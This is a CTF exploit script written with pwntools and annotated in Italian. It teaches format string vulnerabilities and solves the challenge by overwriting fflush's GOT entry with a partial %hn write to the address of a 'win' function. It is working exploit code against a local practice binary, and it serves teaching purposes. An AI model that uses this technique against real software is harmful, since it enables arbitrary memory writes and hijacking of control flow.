#!/bin/python3
from pwn import *

p = process("./chall_11")
p_elf = ELF("./chall_11")
'''
-----------------------------------------------------
printf(format, args*)
https://www.cplusplus.com/reference/cstdio/printf/

"format" è una stringa di formato
NON è la stringa che viene stampata!

Esempio:
printf("Iva al 23%d")

Risultato:
"Iva al 23873892"

Uso corretto:
printf("%s","Iva al 23%")

Perchè è una vulnerabilità?

-> %p o %x => Leak dati dallo stack
E non solo...
-> %s => Lettura arbitraria di tutta la memoria!
Ma anche...
-> %n (con l'ausilio di %[num]d) => Scrittura arbitraria in tutta la memoria!
-----------------------------------------------------
'''


#Saltiamo l'input non vulnerabile
p.sendline()

"""
%n richiede:
Indirizzo di memoria dove scrivere (Come parametro sullo stack)
Stampa del numero di caratteri per scrivere il valore voluto (possibile con %[num]d )

Vediamo una sintassi più generica degli specificatori di formato

%[offset_parametro]$[specificatore]

esempio: %12$p -> Stampa come indirizzo il parametro 12

Cerchiamo il primo parametro:
python -c "print('\nAAAA'+'%p.'*20)" | ./chall_11
Output:                                    >>> <<<
AAAA0xc7.0xf7f95540.0x8048520.(nil).(nil).0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.
   1         2           3      4     5       6

Payload Ipotetico per la scrittura arbitraria
AAAA + %valore_da_scrivere(-4)d + %6$n

Cosa scriviamo?

GOT = Global Offset Table
|-----------------------|
|   func   |    addr    |
|-----------------------|
|  printf  |   0xaaaa   |
|-----------------------|
|  ecc...  |            |
|-----------------------|

Se sovrascritta ci permette di cambiare totalmente la chiamata di una funzione
funzione_vulnerabile: 0xbbbb

|-----------------------|
|   func   |    addr    |
|-----------------------|
|  fflush  |   0xaaaa   |
|-----------------------|
|  ecc...  |            |
|-----------------------|

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

|-----------------------|
|   func   |    addr    |
|-----------------------|
|  fflush  |   0xbbbb   | !!! => fflush = funzione_vulnerabile
|-----------------------|
|  ecc...  |            |
|-----------------------|

scegliamo fflush perchè è la funzione che viene eseguita dopo printf

Obbiettivo della challenge: eseguire la funzione win

Payload:
Indirizzo GOT => fflush  +    Valore da scrivere    +   Scrittura in memoria
       |AAAA|            +    %{indirizzo_win-4}d   +          %6$n

Problema: Un indirizzo di memoria è un valore numerico altissimo, quindi la scrittura dei caratteri a video impega molto tempo

Soluzione: Sovrascrizione parziale dell'indirizzo
Dividiamo in 2 l'indirizzo di memoria

Indirizzo nella GOT: 0xAAAABBBB

Indirizzo da scrivere 0xAAAACCCC

Siccome la prima parte è uguale possiamo sovrascrivere solamente BBBB in CCCC
Come scriviamo 2 Byte al posto di 4 con %n?
-> Specificatori di lunghezza
Quindi scriveremo %hn (h = 2 bytes)

Payload Finale:
Indirizzo GOT => fflush  +    Valore da scrivere    +   Scrittura in memoria (solo 2bytes)
       |AAAA|            +  %{ultimi2byte_win-4}d   +          %6$hn

Ora scriviamo il codice
"""

indirizzo_got_table = p_elf.got["fflush"] 
indirizzo_win_function = p_elf.sym["win"] & 0x0000ffff

payload = p32(indirizzo_got_table) + f"%{indirizzo_win_function-4}d".encode() + b"%6$hn"

p.sendline(payload)

p.interactive()